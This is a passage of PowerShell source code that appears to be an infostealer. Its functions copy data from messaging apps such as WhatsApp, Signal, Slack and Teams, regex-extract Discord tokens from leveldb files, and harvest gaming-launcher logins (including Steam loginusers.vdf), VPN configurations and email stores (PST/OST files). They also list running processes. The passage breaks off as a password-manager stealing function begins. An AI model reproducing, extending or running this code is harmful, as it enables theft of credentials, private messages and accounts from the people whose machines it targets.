        if(Test-Path $whatsappPath) {
            $socialFound = $true
            $dest = Join-Path $OutDir "Social\WhatsApp"
            New-Item -ItemType Directory -Path $dest -Force | Out-Null
            try {
                Copy-Item $whatsappPath $dest -Recurse -Force -ErrorAction SilentlyContinue
                Write-DebugLog "Copied WhatsApp data from: $whatsappPath"
            } catch {
                Write-DebugLog "Failed to copy WhatsApp data from $whatsappPath`: $($_.Exception.Message)"
            }
            break
        }
    }
    
    # Extract Signal data
    Write-DebugLog "Scanning Signal installations..."
    foreach($signalPath in $signalPaths) {
        if(Test-Path $signalPath) {
            $socialFound = $true
            $dest = Join-Path $OutDir "Social\Signal"
            New-Item -ItemType Directory -Path $dest -Force | Out-Null
            try {
                Copy-Item $signalPath $dest -Recurse -Force -ErrorAction SilentlyContinue
                Write-DebugLog "Copied Signal data from: $signalPath"
            } catch {
                Write-DebugLog "Failed to copy Signal data from $signalPath`: $($_.Exception.Message)"
            }
            break
        }
    }
    
    # Extract Slack data
    Write-DebugLog "Scanning Slack installations..."
    foreach($slackPath in $slackPaths) {
        if(Test-Path $slackPath) {
            $socialFound = $true
            $dest = Join-Path $OutDir "Social\Slack"
            New-Item -ItemType Directory -Path $dest -Force | Out-Null
            try {
                Copy-Item $slackPath $dest -Recurse -Force -ErrorAction SilentlyContinue
                Write-DebugLog "Copied Slack data from: $slackPath"
            } catch {
                Write-DebugLog "Failed to copy Slack data from $slackPath`: $($_.Exception.Message)"
            }
            break
        }
    }
    
    # Extract Teams data
    Write-DebugLog "Scanning Microsoft Teams installations..."
    foreach($teamsPath in $teamsPaths) {
        if(Test-Path $teamsPath) {
            $socialFound = $true
            $dest = Join-Path $OutDir "Social\Teams"
            New-Item -ItemType Directory -Path $dest -Force | Out-Null
            try {
                Copy-Item $teamsPath $dest -Recurse -Force -ErrorAction SilentlyContinue
                Write-DebugLog "Copied Teams data from: $teamsPath"
            } catch {
                Write-DebugLog "Failed to copy Teams data from $teamsPath`: $($_.Exception.Message)"
            }
            break
        }
    }
    
    # Extract Skype data
    Write-DebugLog "Scanning Skype installations..."
    foreach($skypePath in $skypePaths) {
        if(Test-Path $skypePath) {
            $socialFound = $true
            $dest = Join-Path $OutDir "Social\Skype\$(Split-Path $skypePath -Leaf)"
            New-Item -ItemType Directory -Path $dest -Force | Out-Null
            try {
                Copy-Item $skypePath $dest -Recurse -Force -ErrorAction SilentlyContinue
                Write-DebugLog "Copied Skype data from: $skypePath"
            } catch {
                Write-DebugLog "Failed to copy Skype data from $skypePath`: $($_.Exception.Message)"
            }
        }
    }
    
    # Extract Zoom data
    Write-DebugLog "Scanning Zoom installations..."
    foreach($zoomPath in $zoomPaths) {
        if(Test-Path $zoomPath) {
            $socialFound = $true
            $dest = Join-Path $OutDir "Social\Zoom"
            New-Item -ItemType Directory -Path $dest -Force | Out-Null
            try {
                Copy-Item $zoomPath $dest -Recurse -Force -ErrorAction SilentlyContinue
                Write-DebugLog "Copied Zoom data from: $zoomPath"
            } catch {
                Write-DebugLog "Failed to copy Zoom data from $zoomPath`: $($_.Exception.Message)"
            }
            break
        }
    }
    
    # Extract other social apps
    Write-DebugLog "Scanning additional social applications..."
    foreach($app in $otherSocialPaths.GetEnumerator()) {
        if(Test-Path $app.Value) {
            $socialFound = $true
            $dest = Join-Path $OutDir "Social\$($app.Name)"
            New-Item -ItemType Directory -Path $dest -Force | Out-Null
            try {
                Copy-Item $app.Value $dest -Recurse -Force -ErrorAction SilentlyContinue
                Write-DebugLog "Copied $($app.Name) data from: $($app.Value)"
            } catch {
                Write-DebugLog "Failed to copy $($app.Name) data from $($app.Value)`: $($_.Exception.Message)"
            }
        }
    }
    
    # Discord token extraction from all Discord installations
    Write-DebugLog "Extracting Discord tokens from all installations..."
    foreach($discordPath in $discordPaths) {
        $leveldbPath = Join-Path $discordPath "Local Storage\leveldb"
        if(Test-Path $leveldbPath) {
            try {
                $re='[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}|mfa\.[\w-]{84}'
                $tok=Get-ChildItem $leveldbPath -Include "*.log","*.ldb" -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
                    try {
                        (Get-Content $_.FullName -Raw -Encoding Default -ErrorAction SilentlyContinue) | Select-String $re -AllMatches | ForEach-Object {$_.Matches.Value}
                    } catch {
                        Write-DebugLog "Failed to read Discord file: $($_.FullName)"
                    }
                }
                if($tok){
                    ($tok|Get-Unique)|Out-File (Join-Path $OutDir "Social\Discord_Tokens_$(Split-Path $discordPath -Leaf).txt") -Encoding utf8
                    Write-DebugLog "Extracted Discord tokens from $(Split-Path $discordPath -Leaf)"
                }
            } catch {
                Write-DebugLog "Discord token extraction failed for $discordPath`: $($_.Exception.Message)"
            }
        }
    }
    
    # Check for running social app processes
    try {
        $socialProcesses = @(Get-Process | Where-Object {$_.ProcessName -match "discord|telegram|whatsapp|signal|slack|teams|skype|zoom|element|keybase|threema|viber|wechat|line|kakaotalk|wickr|riot|mumble|ventrilo|teamspeak|briar|session|jami|tox|pidgin|hexchat|irccloud|mattermost|rocketchat|franz|rambox|ferdi|ferdium|webcord"} -ErrorAction SilentlyContinue)
        if($socialProcesses -and $socialProcesses.Count -gt 0) {
            $socialFound = $true
            $processInfo = $socialProcesses | ForEach-Object { "$($_.ProcessName) - $($_.Path) - PID: $($_.Id)" }
            $processInfo | Out-File (Join-Path $OutDir "Social\RunningSocialProcesses.txt") -Encoding utf8
            Write-DebugLog "Found running social app processes: $($socialProcesses.Count)"
        }
    } catch {
        Write-DebugLog "Social process check failed: $($_.Exception.Message)"
    }
    
    if(-not $socialFound) {
        Write-DebugLog "No social app data found"
    }
    Write-DebugLog "Comprehensive social app extraction completed"
}

function Invoke-GameSteal($OutDir){
    Write-DebugLog "Starting comprehensive game data extraction..."
    
    # Steam locations (multiple possible paths)
    $steamPaths = @(
        "${env:ProgramFiles(x86)}\Steam",
        "$env:ProgramFiles\Steam",
        "$env:USERPROFILE\Documents\My Games\Steam",
        "$env:APPDATA\Steam"
    )
    
    # Epic Games locations
    $epicPaths = @(
        "$env:LOCALAPPDATA\EpicGamesLauncher",
        "$env:APPDATA\Epic\EpicGamesLauncher"
    )
    
    # Battle.net locations
    $battleNetPaths = @(
        "$env:APPDATA\Battle.net",
        "$env:LOCALAPPDATA\Battle.net"
    )
    
    # Origin/EA locations
    $originPaths = @(
        "$env:APPDATA\Origin",
        "$env:LOCALAPPDATA\Origin",
        "$env:APPDATA\EA Desktop",
        "$env:LOCALAPPDATA\Electronic Arts"
    )
    
    # Ubisoft locations
    $ubisoftPaths = @(
        "$env:LOCALAPPDATA\Ubisoft Game Launcher",
        "$env:APPDATA\Uplay"
    )
    
    # GOG Galaxy locations
    $gogPaths = @(
        "$env:LOCALAPPDATA\GOG.com\Galaxy",
        "$env:APPDATA\GOG.com\Galaxy"
    )
    
    # Additional gaming platforms
    $otherGamePlatforms = @{
        "Rockstar"          = "$env:LOCALAPPDATA\Rockstar Games"
        "Bethesda"          = "$env:LOCALAPPDATA\Bethesda.net Launcher"
        "Arc"               = "$env:APPDATA\Arc"
        "Twitch"            = "$env:APPDATA\Twitch"
        "ItchIO"            = "$env:APPDATA\itch"
        "Minecraft"         = "$env:APPDATA\.minecraft"
        "MinecraftLauncher" = "$env:LOCALAPPDATA\Packages\Microsoft.MinecraftUWP_8wekyb3d8bbwe"
        "Roblox"            = "$env:LOCALAPPDATA\Roblox"
        "RiotGames"         = "$env:LOCALAPPDATA\Riot Games"
        "PlayOnLinux"       = "$env:APPDATA\PlayOnLinux"
        "Lutris"            = "$env:APPDATA\lutris"
        "GeForceExperience" = "$env:LOCALAPPDATA\NVIDIA Corporation\GeForce Experience"
        "RadeonSoftware"    = "$env:APPDATA\AMD\CN"
        "Discord_Games"     = "$env:LOCALAPPDATA\Discord\app"
        "RetroArch"         = "$env:APPDATA\RetroArch"
        "Parsec"            = "$env:APPDATA\Parsec"
        "GamePass"          = "$env:LOCALAPPDATA\Packages\Microsoft.GamingApp_8wekyb3d8bbwe"
        "Amazon_Games"      = "$env:LOCALAPPDATA\Amazon Games"
        "IndieGala"         = "$env:APPDATA\IndieGala"
        "Fanatical"         = "$env:APPDATA\Fanatical"
        "Humble_App"        = "$env:APPDATA\Humble App"
        "PlanetSide2"       = "$env:LOCALAPPDATA\Daybreak Game Company"
        "Warframe"          = "$env:LOCALAPPDATA\Warframe"
        "PathOfExile"       = "$env:APPDATA\Path of Exile"
        "World_of_Tanks"    = "$env:APPDATA\Wargaming.net"
        "World_of_Warships" = "$env:APPDATA\Wargaming.net"
        "War_Thunder"       = "$env:LOCALAPPDATA\Gaijin"
        "Blizzard_Games"    = "$env:APPDATA\Battle.net"
        "Heroes_Generals"   = "$env:LOCALAPPDATA\Heroes & Generals"
        "Smite"             = "$env:LOCALAPPDATA\HiRez Studios"
        "Paladins"          = "$env:LOCALAPPDATA\HiRez Studios"
        "Crossout"          = "$env:LOCALAPPDATA\Gaijin\Crossout"
        "Star_Citizen"      = "$env:APPDATA\rsilauncher"
        "Elite_Dangerous"   = "$env:LOCALAPPDATA\Frontier Developments"
        "No_Mans_Sky"       = "$env:APPDATA\HelloGames"
        "Kerbal_Space"      = "$env:APPDATA\Squad\Kerbal Space Program"
        "Cities_Skylines"   = "$env:LOCALAPPDATA\Colossal Order"
        "Sid_Meiers_Civ"    = "$env:USERPROFILE\Documents\My Games\Sid Meier's Civilization VI"
        "Age_of_Empires"    = "$env:USERPROFILE\Games\Age of Empires"
        "Total_War"         = "$env:APPDATA\The Creative Assembly"
        "Paradox_Games"     = "$env:USERPROFILE\Documents\Paradox Interactive"
        "Microsoft_Store_Games" = "$env:LOCALAPPDATA\Packages\Microsoft.GamingServices_8wekyb3d8bbwe"
        "Oculus"            = "$env:APPDATA\Oculus"
        "SteamVR"           = "$env:LOCALAPPDATA\openvr"
        "VRChat"            = "$env:APPDATA\VRChat"
        "RecRoom"           = "$env:LOCALAPPDATA\RecRoom"
        "BigFish_Games"     = "$env:APPDATA\Big Fish Games"
        "GameHouse"         = "$env:APPDATA\GameHouse"
        "MSI_Gaming"        = "$env:LOCALAPPDATA\MSI\One Dragon Center"
        "ASUS_ROG"          = "$env:LOCALAPPDATA\ASUS\ROG Live Service"
        "Logitech_Gaming"   = "$env:LOCALAPPDATA\LGHUB"
        "Razer_Synapse"     = "$env:APPDATA\Razer"
        "Corsair_iCUE"      = "$env:APPDATA\Corsair"
        "SteelSeries_GG"    = "$env:APPDATA\SteelSeries"
    }
    
    $gameFound = $false
    
    # Extract Steam data
    Write-DebugLog "Scanning Steam installations..."
    foreach($steamPath in $steamPaths) {
        if(Test-Path $steamPath) {
            $gameFound = $true
            $dest = Join-Path $OutDir "Games\Steam"
            New-Item -ItemType Directory -Path $dest -Force | Out-Null
            try {
                # Copy Steam config and userdata
                $configPath = Join-Path $steamPath "config"
                $userdataPath = Join-Path $steamPath "userdata"
                
                if(Test-Path $configPath) {
                    Copy-Item $configPath (Join-Path $dest "config") -Recurse -Force -ErrorAction SilentlyContinue
                    Write-DebugLog "Copied Steam config from: $configPath"
                }
                if(Test-Path $userdataPath) {
                    Copy-Item $userdataPath (Join-Path $dest "userdata") -Recurse -Force -ErrorAction SilentlyContinue
                    Write-DebugLog "Copied Steam userdata from: $userdataPath"
                }
                
                # Copy Steam login data
                $loginPath = Join-Path $steamPath "loginusers.vdf"
                if(Test-Path $loginPath) {
                    Copy-Item $loginPath $dest -Force -ErrorAction SilentlyContinue
                    Write-DebugLog "Copied Steam login data"
                }
            } catch {
                Write-DebugLog "Failed to copy Steam data from $steamPath`: $($_.Exception.Message)"
            }
            break # Only need one successful Steam copy
        }
    }
    
    # Extract Epic Games data
    Write-DebugLog "Scanning Epic Games installations..."
    foreach($epicPath in $epicPaths) {
        if(Test-Path $epicPath) {
            $gameFound = $true
            $dest = Join-Path $OutDir "Games\EpicGames"
            New-Item -ItemType Directory -Path $dest -Force | Out-Null
            try {
                Copy-Item $epicPath $dest -Recurse -Force -ErrorAction SilentlyContinue
                Write-DebugLog "Copied Epic Games data from: $epicPath"
            } catch {
                Write-DebugLog "Failed to copy Epic Games data from $epicPath`: $($_.Exception.Message)"
            }
            break
        }
    }
    
    # Extract Battle.net data
    Write-DebugLog "Scanning Battle.net installations..."
    foreach($battleNetPath in $battleNetPaths) {
        if(Test-Path $battleNetPath) {
            $gameFound = $true
            $dest = Join-Path $OutDir "Games\BattleNet"
            New-Item -ItemType Directory -Path $dest -Force | Out-Null
            try {
                Copy-Item $battleNetPath $dest -Recurse -Force -ErrorAction SilentlyContinue
                Write-DebugLog "Copied Battle.net data from: $battleNetPath"
            } catch {
                Write-DebugLog "Failed to copy Battle.net data from $battleNetPath`: $($_.Exception.Message)"
            }
            break
        }
    }
    
    # Extract Origin/EA data
    Write-DebugLog "Scanning Origin/EA installations..."
    foreach($originPath in $originPaths) {
        if(Test-Path $originPath) {
            $gameFound = $true
            $dest = Join-Path $OutDir "Games\Origin\$(Split-Path $originPath -Leaf)"
            New-Item -ItemType Directory -Path $dest -Force | Out-Null
            try {
                Copy-Item $originPath $dest -Recurse -Force -ErrorAction SilentlyContinue
                Write-DebugLog "Copied Origin/EA data from: $originPath"
            } catch {
                Write-DebugLog "Failed to copy Origin/EA data from $originPath`: $($_.Exception.Message)"
            }
        }
    }
    
    # Extract Ubisoft data
    Write-DebugLog "Scanning Ubisoft installations..."
    foreach($ubisoftPath in $ubisoftPaths) {
        if(Test-Path $ubisoftPath) {
            $gameFound = $true
            $dest = Join-Path $OutDir "Games\Ubisoft\$(Split-Path $ubisoftPath -Leaf)"
            New-Item -ItemType Directory -Path $dest -Force | Out-Null
            try {
                Copy-Item $ubisoftPath $dest -Recurse -Force -ErrorAction SilentlyContinue
                Write-DebugLog "Copied Ubisoft data from: $ubisoftPath"
            } catch {
                Write-DebugLog "Failed to copy Ubisoft data from $ubisoftPath`: $($_.Exception.Message)"
            }
        }
    }
    
    # Extract GOG Galaxy data
    Write-DebugLog "Scanning GOG Galaxy installations..."
    foreach($gogPath in $gogPaths) {
        if(Test-Path $gogPath) {
            $gameFound = $true
            $dest = Join-Path $OutDir "Games\GOG"
            New-Item -ItemType Directory -Path $dest -Force | Out-Null
            try {
                Copy-Item $gogPath $dest -Recurse -Force -ErrorAction SilentlyContinue
                Write-DebugLog "Copied GOG Galaxy data from: $gogPath"
            } catch {
                Write-DebugLog "Failed to copy GOG Galaxy data from $gogPath`: $($_.Exception.Message)"
            }
            break
        }
    }
    
    # Extract other gaming platform data
    Write-DebugLog "Scanning additional gaming platforms..."
    foreach($platform in $otherGamePlatforms.GetEnumerator()) {
        if(Test-Path $platform.Value) {
            $gameFound = $true
            $dest = Join-Path $OutDir "Games\$($platform.Name)"
            New-Item -ItemType Directory -Path $dest -Force | Out-Null
            try {
                Copy-Item $platform.Value $dest -Recurse -Force -ErrorAction SilentlyContinue
                Write-DebugLog "Copied $($platform.Name) data from: $($platform.Value)"
            } catch {
                Write-DebugLog "Failed to copy $($platform.Name) data from $($platform.Value)`: $($_.Exception.Message)"
            }
        }
    }
    
    # Search for game save files in common locations
    Write-DebugLog "Searching for game save files..."
    $gameSavePaths = @(
        "$env:USERPROFILE\Documents\My Games",
        "$env:USERPROFILE\Saved Games",
        "$env:LOCALAPPDATA\SavedGames"
    )
    
    foreach($savePath in $gameSavePaths) {
        if(Test-Path $savePath) {
            try {
                $saveFiles = Get-ChildItem $savePath -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.PSIsContainer -eq $false -and $_.Length -lt 100MB}
                if($saveFiles -and $saveFiles.Count -gt 0) {
                    $gameFound = $true
                    $dest = Join-Path $OutDir "Games\SaveFiles\$(Split-Path $savePath -Leaf)"
                    New-Item -ItemType Directory -Path $dest -Force | Out-Null
                    Copy-Item $savePath $dest -Recurse -Force -ErrorAction SilentlyContinue
                    Write-DebugLog "Copied game saves from: $savePath"
                }
            } catch {
                Write-DebugLog "Error processing game saves in $savePath`: $($_.Exception.Message)"
            }
        }
    }
    
    # Check for running gaming processes
    try {
        $gamingProcesses = @(Get-Process | Where-Object {$_.ProcessName -match "steam|epic|battle|origin|uplay|gog|rockstar|bethesda|arc|twitch|itch|minecraft|roblox|riot|parsec|retroarch|discord"} -ErrorAction SilentlyContinue)
        if($gamingProcesses -and $gamingProcesses.Count -gt 0) {
            $gameFound = $true
            $processInfo = $gamingProcesses | ForEach-Object { "$($_.ProcessName) - $($_.Path) - PID: $($_.Id)" }
            $processInfo | Out-File (Join-Path $OutDir "Games\RunningGamingProcesses.txt") -Encoding utf8
            Write-DebugLog "Found running gaming processes: $($gamingProcesses.Count)"
        }
    } catch {
        Write-DebugLog "Gaming process check failed: $($_.Exception.Message)"
    }
    
    if(-not $gameFound) {
        Write-DebugLog "No gaming platform data found"
    }
    Write-DebugLog "Comprehensive game data extraction completed"
}

function Invoke-VPNSteal($OutDir){
    Write-DebugLog "Starting VPN data extraction..."
    $vpns=@{
        # NordVPN multiple locations
        "NordVPN_LocalAppData"="$env:LOCALAPPDATA\NordVPN"
        "NordVPN_AppData"="$env:APPDATA\NordVPN"
        "NordVPN_ProgramData"="$env:ProgramData\NordVPN"
        
        # OpenVPN multiple locations
        "OpenVPN_Profiles"="$env:ProgramFiles\OpenVPN Connect\profiles"
        "OpenVPN_Config"="$env:ProgramFiles\OpenVPN\config"
        "OpenVPN_AppData"="$env:APPDATA\OpenVPN Connect"
        "OpenVPN_LocalAppData"="$env:LOCALAPPDATA\OpenVPN"
        
        # ProtonVPN multiple locations
        "ProtonVPN_Config"="$env:LOCALAPPDATA\ProtonVPN"
        "ProtonVPN_AppData"="$env:APPDATA\ProtonVPN"
        "ProtonVPN_ProgramData"="$env:ProgramData\ProtonVPN"
        
        # ExpressVPN multiple locations
        "ExpressVPN_ProgramData"="$env:ProgramData\ExpressVPN"
        "ExpressVPN_LocalAppData"="$env:LOCALAPPDATA\ExpressVPN"
        "ExpressVPN_AppData"="$env:APPDATA\ExpressVPN"
        
        # Surfshark multiple locations
        "Surfshark_LocalAppData"="$env:LOCALAPPDATA\Surfshark"
        "Surfshark_AppData"="$env:APPDATA\Surfshark"
        "Surfshark_ProgramData"="$env:ProgramData\Surfshark"
        
        # CyberGhost multiple locations
        "CyberGhost_LocalAppData"="$env:LOCALAPPDATA\CyberGhost"
        "CyberGhost_AppData"="$env:APPDATA\CyberGhost"
        "CyberGhost_ProgramData"="$env:ProgramData\CyberGhost VPN"
        
        # WireGuard multiple locations
        "WireGuard_AppData"="$env:APPDATA\WireGuard"
        "WireGuard_LocalAppData"="$env:LOCALAPPDATA\WireGuard"
        "WireGuard_ProgramData"="$env:ProgramData\WireGuard"
        
        # TunnelBear multiple locations
        "TunnelBear_LocalAppData"="$env:LOCALAPPDATA\TunnelBear"
        "TunnelBear_AppData"="$env:APPDATA\TunnelBear"
        "TunnelBear_ProgramData"="$env:ProgramData\TunnelBear"
        
        # Windscribe multiple locations
        "Windscribe_LocalAppData"="$env:LOCALAPPDATA\Windscribe"
        "Windscribe_AppData"="$env:APPDATA\Windscribe"
        "Windscribe_ProgramData"="$env:ProgramData\Windscribe"
        
        # IPVanish multiple locations
        "IPVanish_LocalAppData"="$env:LOCALAPPDATA\IPVanish VPN"
        "IPVanish_AppData"="$env:APPDATA\IPVanish"
        "IPVanish_ProgramData"="$env:ProgramData\IPVanish VPN"
        
        # Private Internet Access multiple locations
        "PIA_LocalAppData"="$env:LOCALAPPDATA\Private Internet Access"
        "PIA_AppData"="$env:APPDATA\Private Internet Access"
        "PIA_ProgramData"="$env:ProgramData\Private Internet Access"
        
        # Additional VPN services with comprehensive paths
        "HotspotShield_LocalAppData"="$env:LOCALAPPDATA\Hotspot Shield"
        "HotspotShield_AppData"="$env:APPDATA\Hotspot Shield"
        "HotspotShield_ProgramData"="$env:ProgramData\Hotspot Shield"
        
        "VyprVPN_LocalAppData"="$env:LOCALAPPDATA\VyprVPN"
        "VyprVPN_AppData"="$env:APPDATA\VyprVPN"
        "VyprVPN_ProgramData"="$env:ProgramData\VyprVPN"
        
        "HideMyAss_LocalAppData"="$env:LOCALAPPDATA\HideMyAss"
        "HideMyAss_AppData"="$env:APPDATA\HideMyAss"
        "HideMyAss_ProgramData"="$env:ProgramData\HideMyAss VPN"
        
        "AtlasVPN_LocalAppData"="$env:LOCALAPPDATA\Atlas VPN"
        "AtlasVPN_AppData"="$env:APPDATA\Atlas VPN"
        "AtlasVPN_ProgramData"="$env:ProgramData\Atlas VPN"
        
        "FastestVPN_LocalAppData"="$env:LOCALAPPDATA\FastestVPN"
        "FastestVPN_AppData"="$env:APPDATA\FastestVPN"
        "FastestVPN_ProgramData"="$env:ProgramData\FastestVPN"
    }
    
    $vpnFound = $false
    foreach($v in $vpns.GetEnumerator()){
        if(Test-Path $v.Value){
            $vpnFound = $true
            $dest=Join-Path $OutDir "VPNs\$($v.Name)"
            New-Item -ItemType Directory -Path (Split-Path $dest -Parent) -Force | Out-Null
            try{
                Copy-Item $v.Value $dest -Recurse -Force -ErrorAction SilentlyContinue
                Write-DebugLog "Copied VPN data: $($v.Name) from $($v.Value)"
                
                # Also try to copy specific config files
                if($v.Name -like "*ProtonVPN*") {
                    $configFiles = @(
                        "$env:APPDATA\ProtonVPN\settings.json",
                        "$env:LOCALAPPDATA\ProtonVPN\config.json",
                        "$env:LOCALAPPDATA\ProtonVPN\ProtonVPN.exe.config"
                    )
                    foreach($configFile in $configFiles) {
                        if(Test-Path $configFile) {
                            $configDest = Join-Path $dest (Split-Path $configFile -Leaf)
                            Copy-Item $configFile $configDest -Force -ErrorAction SilentlyContinue
                            Write-DebugLog "Copied ProtonVPN config: $(Split-Path $configFile -Leaf)"
                        }
                    }
                }
            }catch{
                Write-DebugLog "Failed to copy VPN data $($v.Name): $($_.Exception.Message)"
            }
        }
    }
    
    # Also check for VPN processes and installed programs
    try {
        $vpnProcesses = @(Get-Process | Where-Object {$_.ProcessName -match "proton|nord|express|surfshark|cyberghost|wireguard|openvpn|tunnelbear|windscribe|ipvanish|pia|private"} -ErrorAction SilentlyContinue)
        if($vpnProcesses -and $vpnProcesses.Count -gt 0) {
            $vpnFound = $true
            $processInfo = $vpnProcesses | ForEach-Object { "$($_.ProcessName) - $($_.Path)" }
            $processInfo | Out-File (Join-Path $OutDir "VPNs\RunningVPNProcesses.txt") -Encoding utf8
            Write-DebugLog "Found running VPN processes: $($vpnProcesses.Count)"
        }
        
        # Check registry for installed VPN software
        $vpnRegPaths = @(
            "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*",
            "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"
        )
        
        $installedVPNs = @()
        foreach($regPath in $vpnRegPaths) {
            Get-ItemProperty $regPath -ErrorAction SilentlyContinue | 
            Where-Object {$_.PSObject.Properties.Name -contains 'DisplayName' -and $_.DisplayName -match "ProtonVPN|NordVPN|ExpressVPN|Surfshark|CyberGhost|WireGuard|OpenVPN|TunnelBear|Windscribe|IPVanish|Private Internet Access"} |
            ForEach-Object { 
                $location = if($_.PSObject.Properties.Name -contains 'InstallLocation') { $_.InstallLocation } else { "Unknown" }
                $installedVPNs += "$($_.DisplayName) - $location" 
            }
        }
        
        if($installedVPNs) {
            $vpnFound = $true
            $installedVPNs | Out-File (Join-Path $OutDir "VPNs\InstalledVPNs.txt") -Encoding utf8
            Write-DebugLog "Found installed VPN software: $($installedVPNs.Count)"
        }
    } catch {
        Write-DebugLog "VPN process/registry check failed: $($_.Exception.Message)"
    }
    
    if(-not $vpnFound) {
        Write-DebugLog "No VPN data found"
    }
    Write-DebugLog "VPN data extraction completed"
}

function Invoke-EmailSteal($OutDir){
    Write-DebugLog "Starting comprehensive email client extraction..."
    
    # Outlook locations (multiple versions)
    $outlookPaths = @(
        "$env:APPDATA\Microsoft\Outlook",
        "$env:LOCALAPPDATA\Microsoft\Outlook",
        "$env:USERPROFILE\Documents\Outlook Files"
    )
    
    # Thunderbird locations
    $thunderbirdPaths = @(
        "$env:APPDATA\Thunderbird\Profiles",
        "$env:LOCALAPPDATA\Thunderbird\Profiles"
    )
    
    # Windows Mail/Outlook Express locations
    $windowsMailPaths = @(
        "$env:LOCALAPPDATA\Microsoft\Windows Mail",
        "$env:LOCALAPPDATA\Microsoft\Windows Live Mail",
        "$env:APPDATA\Microsoft\Windows Live Mail",
        "$env:LOCALAPPDATA\Identities"
    )
    
    # Additional email clients
    $otherEmailClients = @{
        "MailBird"          = "$env:LOCALAPPDATA\Mailbird"
        "eM_Client"         = "$env:APPDATA\eM Client"
        "PostboxApp"        = "$env:APPDATA\Postbox"
        "Opera_Mail"        = "$env:APPDATA\Opera Mail"
        "IncrediMail"       = "$env:APPDATA\IncrediMail"
        "Becky"             = "$env:APPDATA\Becky! Internet Mail"
        "ClawsMail"         = "$env:APPDATA\Claws-mail"
        "SeaMonkey"         = "$env:APPDATA\Mozilla\SeaMonkey\Profiles"
        "PocoMail"          = "$env:APPDATA\PocoMail"
        "TheBat"            = "$env:APPDATA\The Bat!"
        "FoxMail"           = "$env:APPDATA\Foxmail7\Storage"
        "DreamMail"         = "$env:APPDATA\DreamMail"
        "Koma_Mail"         = "$env:APPDATA\Koma-Mail"
        "YahooPOPs"         = "$env:APPDATA\YahooPOPs"
        "Eudora"            = "$env:APPDATA\Qualcomm\Eudora"
        "AirMail"           = "$env:APPDATA\AirMail"
    }
    
    $emailFound = $false
    
    # Extract Outlook data
    Write-DebugLog "Scanning Outlook installations..."
    foreach($outlookPath in $outlookPaths) {
        if(Test-Path $outlookPath) {
            $emailFound = $true
            $dest = Join-Path $OutDir "Emails\Outlook\$(Split-Path $outlookPath -Leaf)"
            New-Item -ItemType Directory -Path $dest -Force | Out-Null
            try {
                Copy-Item $outlookPath $dest -Recurse -Force -ErrorAction SilentlyContinue
                Write-DebugLog "Copied Outlook data from: $outlookPath"
            } catch {
                Write-DebugLog "Failed to copy Outlook data from $outlookPath`: $($_.Exception.Message)"
            }
        }
    }
    
    # Extract Thunderbird data
    Write-DebugLog "Scanning Thunderbird installations..."
    foreach($thunderbirdPath in $thunderbirdPaths) {
        if(Test-Path $thunderbirdPath) {
            $emailFound = $true
            $dest = Join-Path $OutDir "Emails\Thunderbird"
            New-Item -ItemType Directory -Path $dest -Force | Out-Null
            try {
                Copy-Item $thunderbirdPath $dest -Recurse -Force -ErrorAction SilentlyContinue
                Write-DebugLog "Copied Thunderbird data from: $thunderbirdPath"
            } catch {
                Write-DebugLog "Failed to copy Thunderbird data from $thunderbirdPath`: $($_.Exception.Message)"
            }
            break
        }
    }
    
    # Extract Windows Mail data
    Write-DebugLog "Scanning Windows Mail installations..."
    foreach($windowsMailPath in $windowsMailPaths) {
        if(Test-Path $windowsMailPath) {
            $emailFound = $true
            $dest = Join-Path $OutDir "Emails\WindowsMail\$(Split-Path $windowsMailPath -Leaf)"
            New-Item -ItemType Directory -Path $dest -Force | Out-Null
            try {
                Copy-Item $windowsMailPath $dest -Recurse -Force -ErrorAction SilentlyContinue
                Write-DebugLog "Copied Windows Mail data from: $windowsMailPath"
            } catch {
                Write-DebugLog "Failed to copy Windows Mail data from $windowsMailPath`: $($_.Exception.Message)"
            }
        }
    }
    
    # Extract other email clients
    Write-DebugLog "Scanning additional email clients..."
    foreach($client in $otherEmailClients.GetEnumerator()) {
        if(Test-Path $client.Value) {
            $emailFound = $true
            $dest = Join-Path $OutDir "Emails\$($client.Name)"
            New-Item -ItemType Directory -Path $dest -Force | Out-Null
            try {
                Copy-Item $client.Value $dest -Recurse -Force -ErrorAction SilentlyContinue
                Write-DebugLog "Copied $($client.Name) data from: $($client.Value)"
            } catch {
                Write-DebugLog "Failed to copy $($client.Name) data from $($client.Value)`: $($_.Exception.Message)"
            }
        }
    }
    
    # Search for email files in common locations
    Write-DebugLog "Searching for email files..."
    $emailSearchPaths = @(
        "$env:USERPROFILE\Documents",
        "$env:USERPROFILE\Desktop"
    )
    
    $emailFilePatterns = @("*.pst", "*.ost", "*.dbx", "*.eml", "*.mbox", "*.mbx")
    
    foreach($searchPath in $emailSearchPaths) {
        if(Test-Path $searchPath) {
            foreach($pattern in $emailFilePatterns) {
                try {
                    $foundFiles = Get-ChildItem $searchPath -Filter $pattern -Recurse -ErrorAction SilentlyContinue
                    if($foundFiles) {
                        $emailFound = $true
                        foreach($file in $foundFiles) {
                            $dest = Join-Path $OutDir "Emails\FoundFiles\$(Split-Path $searchPath -Leaf)"
                            New-Item -ItemType Directory -Path $dest -Force | Out-Null
                            Copy-Item $file.FullName $dest -Force -ErrorAction SilentlyContinue
                            Write-DebugLog "Found email file: $($file.Name) in $searchPath"
                        }
                    }
                } catch {
                    Write-DebugLog "Error searching for email files in $searchPath`: $($_.Exception.Message)"
                }
            }
        }
    }
    
    # Check for running email processes
    try {
        $emailProcesses = @(Get-Process | Where-Object {$_.ProcessName -match "outlook|thunderbird|mailbird|emclient|postbox|opera|incredimail|becky|claws|seamonkey|poco|thebat|foxmail|dream|koma|yahoo|eudora|airmail"} -ErrorAction SilentlyContinue)
        if($emailProcesses -and $emailProcesses.Count -gt 0) {
            $emailFound = $true
            $processInfo = $emailProcesses | ForEach-Object { "$($_.ProcessName) - $($_.Path) - PID: $($_.Id)" }
            $processInfo | Out-File (Join-Path $OutDir "Emails\RunningEmailProcesses.txt") -Encoding utf8
            Write-DebugLog "Found running email processes: $($emailProcesses.Count)"
        }
    } catch {
        Write-DebugLog "Email process check failed: $($_.Exception.Message)"
    }
    
    if(-not $emailFound) {
        Write-DebugLog "No email client data found"
    }
    Write-DebugLog "Comprehensive email client extraction completed"
}

function Invoke-PasswordManagerSteal($OutDir){
    Write-DebugLog "Starting comprehensive password manager extraction..."
    
